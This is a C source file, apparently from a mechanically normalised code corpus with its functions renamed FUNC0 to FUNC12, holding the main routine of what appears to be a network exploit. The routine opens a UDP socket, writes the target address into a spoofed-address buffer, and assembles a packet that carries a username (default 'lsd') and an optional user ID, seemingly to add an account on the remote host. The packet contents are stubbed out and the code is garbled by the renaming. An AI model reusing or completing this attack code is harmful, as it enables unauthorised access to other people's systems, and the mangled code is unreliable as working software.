#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  SOCK_DGRAM ; 
 char adr ; 
 unsigned int FUNC0 (char*) ; 
 char* dodaj_five ; 
 char* dodaj_four ; 
 unsigned int* dodaj_one ; 
 char* dodaj_three ; 
 char* dodaj_two ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 char* fake_adrs ; 
 char* FUNC2 () ; 
 int FUNC3 (int,char**,char*) ; 
 char FUNC4 (char*) ; 
 int /*<<< orphan*/  FUNC5 (char*) ; 
 int /*<<< orphan*/  FUNC6 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC7 (unsigned int) ; 
 int /*<<< orphan*/  FUNC8 (char*,char*) ; 
 int /*<<< orphan*/  sck ; 
 int /*<<< orphan*/  FUNC9 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC10 (char*,char*) ; 
 char FUNC11 (char*) ; 

FUNC12(int argc,char **argv){
    int c,user,version,probe;
    unsigned int offset,gr_offset,userid;
    char *sys_info;
    char username[20];
    extern char *optarg;
    extern int optind; 

    if(argc<2) {FUNC5(argv[0]);FUNC1(0);}
    optind=2;
    offset=40;
    user=version=probe=0;
    while((c=FUNC3(argc,argv,"u:i:p"))!=-1)
        switch(c){
        case 'u': FUNC10(username,optarg);
                  user=1;
                  break;
        case 'i': version=62;
                  userid=FUNC0(optarg);
                  break;
        case 'p': probe=1;
                  break;
        case '?':
        default : FUNC5(argv[0]); 
                  FUNC1(1);
        }

    sck=FUNC9(AF_INET,SOCK_DGRAM,0);
    adr=FUNC4(argv[1]);
    FUNC6(&fake_adrs[4],&adr,4);

    if(!(sys_info=FUNC2())){
        FUNC8("error: can't get system ID for %s.\n",argv[1]);
        FUNC1(1);
    }
    if(!probe){
        FUNC6(&dodaj_two[0x0d],sys_info,sys_info[0]+1);
        FUNC6(&dodaj_two[0x0d+sys_info[0]+1],&dodaj_three[0],27);
        offset+=sys_info[0]+1; 

        if(!user) FUNC10(username,"lsd");
        dodaj_two[offset++]=FUNC11(username);
        FUNC10(&dodaj_two[offset],username);offset+=FUNC11(username);
        FUNC6(&dodaj_two[offset],&dodaj_four[0],200);
        offset+=200;
        gr_offset=offset-15;
        if(version){ 
            dodaj_two[gr_offset++]='u'; 
            dodaj_two[gr_offset++]='s'; 
            dodaj_two[gr_offset++]='e'; 
            dodaj_two[gr_offset++]='r'; 
            dodaj_two[offset++]=0x02;
            dodaj_two[offset++]=userid>>8;
            dodaj_two[offset++]=userid&0xff; 
        }
        else dodaj_two[offset++]=0x00; 
    
        FUNC6(&dodaj_two[offset],&dodaj_five[0],39);
        offset+=39;
        dodaj_one[10]=offset>>8;
        dodaj_one[11]=offset&0xff;
        FUNC7(offset);
    }
}